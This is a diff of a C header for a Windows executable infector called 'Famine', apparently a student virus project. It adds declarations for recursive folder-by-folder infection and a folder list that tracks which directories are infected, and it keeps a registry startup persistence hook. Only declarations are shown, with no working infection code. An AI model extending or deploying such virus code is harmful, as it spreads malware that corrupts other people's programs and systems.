@@ -30,6 +30,7 @@
 # define TEMP_PATH			"\\Local\\Temp"
 # define BACKSLASH			"\\"
 # define DEBUG_MODE			"DEBUG"
+# define RECURSIVE_MODE		"RECURSIVE"
 # define bool				int
 # define true				1
 # define false				0
@@ -42,6 +43,8 @@
 # define SIGNATURE 			"frmarinh-jguyet"
 # define STARTUP_VALUE		"Famine startup"
 # define ARGS_STARTUP		" %DEBUG"
+# define MAX_WINDOWS_PATH	1024
+# define MAX_RECURSIVE_PATH	4096
 
 typedef __int32				int32_t;
 typedef unsigned __int32	uint32_t;
@@ -213,7 +216,16 @@ typedef struct		s_famine
 	char			*executable_path;
 	char			*buffer;
 	int				buffer_len;
+	bool			recursive;
+	char			*recursive_path;
 }					t_famine;
+
+typedef struct		s_folder
+{
+	char			*folder;
+	bool			infected;
+	struct s_folder	*next;
+}					t_folder;
 
 /*
 **	MAIN
@@ -252,10 +264,15 @@ struct stat			*check_access_file(char *file, t_famine *famine);
 /*
 **	READ PE
 */
-t_pe				*pe(t_famine *famine, char *folder_path, char *file_name);
+t_pe				*pe(t_famine *famine, char *folder_path, char *file_name, bool is_recursive);
 
 /*
 **	REGISTERY
 */
 void				startup_registery(t_famine *famine);
+
+/*
+**	RECURSIVE
+*/
+void				infect_recursively(t_famine *famine);
 #endif
